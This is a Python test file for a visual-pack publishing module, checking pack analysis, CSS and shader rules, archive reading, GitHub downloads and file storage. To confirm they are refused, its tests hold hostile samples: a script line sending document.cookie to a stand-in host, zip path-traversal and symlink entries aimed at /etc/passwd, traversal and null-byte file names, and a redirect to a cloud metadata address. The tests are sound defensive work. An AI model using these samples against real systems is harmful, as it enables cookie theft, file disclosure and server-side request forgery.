"""028 (from the POC of issue 1): the pack format, the analysis, the sources and the stored files."""

import json
from pathlib import Path
from typing import Any

import httpx
import pytest

from portalab.modules.visuals.analysis import VOCABULARY, analyse, interface_selector_ok, look_selector_ok
from portalab.modules.visuals.github import GitHub, GitHubError, parse_address
from portalab.modules.visuals.manifest import parse_element, version_key
from portalab.modules.visuals.store import MAX_FILE_BYTES, Files, PackageError, Store, read_source, read_zip
from tests.unit.visuals.support import FakeInterfaces, files_of, tiny_pack, zip_of

EXAMPLES = Path(__file__).resolve().parents[4] / "examples" / "visual-packs"


def test_the_example_pack_is_publishable_and_flags_its_script_and_its_hd_looks() -> None:
    report = analyse(read_source(EXAMPLES / "nordlys"), interfaces=FakeInterfaces())
    summary = report["summary"]
    assert summary["publishable"] and summary["hd"] and summary["script"]
    assert summary["elements"] == 12
    kinds = {e["product"]: e["kind"] for e in report["elements"]}
    assert kinds["levelup_nordlys"] == "glsl" and kinds["effect_nordlysglow"] == "js"
    assert kinds["theme_nordlys"] == "theme" and kinds["frame_fjordring"] == "css"
    # its script runs in the sandbox: noted, never a warning; nothing else to say
    assert [i["code"] for i in report["items"] if i["level"] != "info"] == []
    sandboxed = next(i for i in report["items"] if i["code"] == "js.sandboxed")
    assert sandboxed["category"] == "security"


def test_an_interface_cannot_be_checked_without_ui() -> None:
    report = analyse(read_source(EXAMPLES / "nordlys"))
    assert "theme.unchecked" in [i["code"] for i in report["items"] if i["level"] == "blocking"]


@pytest.mark.parametrize(
    ("change", "code"),
    [
        ({"look": "gold"}, "look.builtin"),  # a built-in frame's key
        ({"render": {"kind": "js", "file": "f.js"}}, "render.kind"),  # a frame is not a script
        ({"render": {"kind": "css", "css": ["missing.css"]}}, "file.missing"),
        ({"economy": {"price": 10, "rarity": "mythic"}}, "economy.rarity"),
        ({"payload": {"priority": 1}}, "payload.fields"),
        ({"render": {"kind": "renderer"}}, "render.no_renderer"),
    ],
)
def test_blocking_findings(change: dict[str, Any], code: str) -> None:
    report = analyse(files_of(tiny_pack(**change)))
    assert code in [i["code"] for i in report["items"] if i["level"] == "blocking"]
    assert not report["summary"]["publishable"]


def test_findings_are_split_between_the_analysis_and_the_security_steps() -> None:
    files = tiny_pack()
    files["elements/frame/f.css"] = '@import "x.css"; .avatar-frame[data-frame="tiny"] { color: red }'
    report = analyse(files_of(files))
    item = next(i for i in report["items"] if i["code"] == "css.import")
    assert item["category"] == "security" and report["summary"]["security"]["blocking"] == 1
    assert next(i for i in report["items"] if i["code"] == "element.no_preview")["category"] == "analysis"


def test_a_builtin_pack_brings_the_builtin_looks() -> None:
    report = analyse(files_of(tiny_pack(look="gold")), builtin=True)
    assert "look.builtin" not in [i["code"] for i in report["items"]]


def test_a_look_held_by_another_pack_is_blocking_unless_it_replaces_it() -> None:
    taken = {("avatar_frame", "tiny"): "other"}
    report = analyse(files_of(tiny_pack()), taken=taken)
    assert {i["code"]: i["level"] for i in report["items"]}["look.taken"] == "blocking"
    report = analyse(files_of(tiny_pack(replaces=True)), taken=taken)
    assert {i["code"]: i["level"] for i in report["items"]}["look.replaces"] == "warning"


def test_a_look_that_replaces_a_builtin_one_is_a_warning_and_its_css_must_aim_at_its_look_only() -> None:
    files = tiny_pack(look="gold", replaces=True)
    files["elements/frame/f.css"] = 'body { color: red } .avatar-frame[data-frame="gold"] { color: red }'
    report = analyse(files_of(files))
    codes = {i["code"]: i["level"] for i in report["items"]}
    assert codes["look.replaces_builtin"] == "warning"
    assert codes["css.unscoped"] == "blocking"  # a rule reaching outside its own element


def test_js_and_glsl_contracts() -> None:
    files = tiny_pack(type="effect", look="zap", render={"kind": "js", "file": "z.js"})
    files["elements/frame/z.js"] = "fetch('https://x.example/'+document.cookie)"
    codes = {i["code"] for i in analyse(files_of(files))["items"]}
    assert {"js.no_export", "js.network", "js.storage", "js.sandboxed"} <= codes
    files = tiny_pack(type="level_up", look="zap", render={"kind": "glsl", "file": "z.glsl", "stage": True})
    files["elements/frame/z.glsl"] = "float out = 1.0;"
    codes = {i["code"] for i in analyse(files_of(files))["items"]}
    assert {"glsl.shape_contract", "glsl.reserved"} <= codes


def test_a_glsl_body_never_declares_again_what_the_portal_gives_it() -> None:
    render = {"kind": "glsl", "file": "z.glsl", "stage": True}
    files = tiny_pack(type="booster_opening", look="zap", render=render)

    def reserved(source: str) -> set[str]:
        files["elements/frame/z.glsl"] = source
        items = analyse(files_of(files))["items"]
        return {i["params"]["name"] for i in items if i["code"] == "glsl.reserved"}

    # at the body's own level ``d`` is already declared (the badge's distance): it would not compile
    assert reserved("vec2 d = gl_FragCoord.xy;\no = vec4(d, 0.0, 1.0);") == {"d"}
    # a block or a loop of its own may shadow it; a comment is not code
    assert reserved("for (int t = 0; t < 3; t++) { float d = 1.0; o += vec4(d); }\n// float o;\n") == set()
    assert reserved("vec2 dv = vec2(0.0);\no = vec4(dv, 0.0, 1.0);") == set()


def test_the_proof_of_concepts_none_is_data() -> None:
    element = parse_element(
        json.dumps({"type": "badge", "names": {"en": "B"}, "render": {"kind": "none"}}), "b"
    )
    assert element.render.kind == "data"


def test_an_unsafe_zip_is_refused_and_a_github_archive_is_read_from_its_folder() -> None:
    with pytest.raises(PackageError):
        read_zip(zip_of({"../evil.txt": "x", "pack.json": "{}"}))
    with pytest.raises(PackageError):
        read_zip(zip_of({"pack.json": "{}", "big.css": b"0" * (MAX_FILE_BYTES + 1)}))
    with pytest.raises(PackageError):
        read_zip(zip_of({"pack.json": "{}", "a\x01b.css": "x"}))
    files = read_zip(zip_of(tiny_pack(), prefix="repo-main/packs/tiny/"), "packs/tiny")
    assert "pack.json" in files.entries and "elements/frame/f.css" in files.entries


def test_a_link_inside_an_archive_is_refused() -> None:
    import io
    import zipfile

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("pack.json", "{}")
        link = zipfile.ZipInfo("elements/x/secret.css")
        link.external_attr = 0o120777 << 16
        archive.writestr(link, "/etc/passwd")
    with pytest.raises(PackageError):
        read_zip(buffer.getvalue())


def test_versions_order() -> None:
    assert version_key("1.10.0") > version_key("1.9.2") > version_key("1.9.2-rc1")
    assert version_key("1.0") == version_key("1.0.0")


def test_github_addresses() -> None:
    assert parse_address("https://github.com/acme/looks").repo == "looks"
    repository = parse_address("https://github.com/acme/looks/tree/main/packs/tiny")
    assert (repository.ref, repository.folder) == ("main", "packs/tiny")
    with pytest.raises(GitHubError):
        parse_address("https://github.com/acme/looks/tree/main/../../other")


async def test_github_never_follows_a_redirect_elsewhere() -> None:
    def answer(request: httpx.Request) -> httpx.Response:
        return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data"})

    github = GitHub(httpx.AsyncClient(transport=httpx.MockTransport(answer)))
    with pytest.raises(GitHubError):
        await github.offer(parse_address("https://github.com/acme/looks"))


async def test_an_answer_too_large_is_cut() -> None:
    def answer(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, content=b"0" * (21 * 1024 * 1024))

    github = GitHub(httpx.AsyncClient(transport=httpx.MockTransport(answer)))
    with pytest.raises(PackageError):
        await github.download(parse_address("https://github.com/acme/looks"), "main")


@pytest.mark.parametrize(
    ("selector", "ok"),
    [
        ('.avatar-frame[data-frame="x"]', True),
        ('.avatar-frame[data-frame="x"]::before', True),
        ('.avatar-frame[data-frame="x"] .inner > span', True),
        ('.avatar-frame[data-frame="x"] ~ .price', False),  # its siblings: outside its element
        ('.avatar-frame[data-frame="x"] + *', False),
        ('body .avatar-frame[data-frame="x"]', False),
        (':root .avatar-frame[data-frame="x"]', False),
        ('.dialog:has([data-frame="x"])', False),
        (".purchase .price", False),
        ('[data-frame="other"]', False),
    ],
)
def test_a_look_styles_its_own_element_only(selector: str, ok: bool) -> None:
    assert look_selector_ok(selector, "x") is ok


def test_an_interface_styles_under_its_own_key_and_renames_navigation_and_titles_only() -> None:
    assert interface_selector_ok('[data-theme="n"] .shell-header', "n")
    assert not interface_selector_ok(".shell-header", "n")
    assert not interface_selector_ok('[data-theme="other"] .x', "n")
    assert VOCABULARY.fullmatch("nav:nav.home") and VOCABULARY.fullmatch("news:title")
    assert not VOCABULARY.fullmatch("marketplace:buy.confirm")  # what a member confirms stays Portalab's


def test_stored_files_never_leave_their_folder(tmp_path: Path) -> None:
    store = Store(tmp_path)
    files = Files({"pack.json": b"{}", "a.css": b"x"})
    store.keep("p", files)
    assert store.file("p", files.sha, "a.css") is not None
    for name in ("../../state.json", "a.css\0.png", "/etc/passwd", "../" * 8 + "etc/passwd"):
        assert store.file("p", files.sha, name) is None
    store.drop("p", files.sha)
    assert store.file("p", files.sha, "a.css") is None


def test_a_link_in_a_dropped_folder_is_never_followed(tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("server file")
    pack = tmp_path / "pack"
    pack.mkdir()
    (pack / "pack.json").write_text("{}")
    (pack / "stolen.txt").symlink_to(secret)
    assert "stolen.txt" not in read_source(pack).entries


def test_an_interface_naming_a_navigation_nobody_brings_is_refused(tmp_path: Path) -> None:
    import shutil

    pack = tmp_path / "abysses"
    shutil.copytree(EXAMPLES / "abysses", pack)
    definition = pack / "elements" / "interface-abysses" / "interface.json"
    document = json.loads(definition.read_text())
    document["layout"]["nav"] = {"desktop": "nowhere", "tablet": "nowhere", "phone": "nowhere"}
    definition.write_text(json.dumps(document))
    report = analyse(read_source(pack), interfaces=FakeInterfaces())
    assert "theme.invalid" in {i["code"] for i in report["items"] if i["level"] == "blocking"}
    # its own navigation (« sonar ») is fine
    assert analyse(read_source(EXAMPLES / "abysses"), interfaces=FakeInterfaces())["summary"]["publishable"]
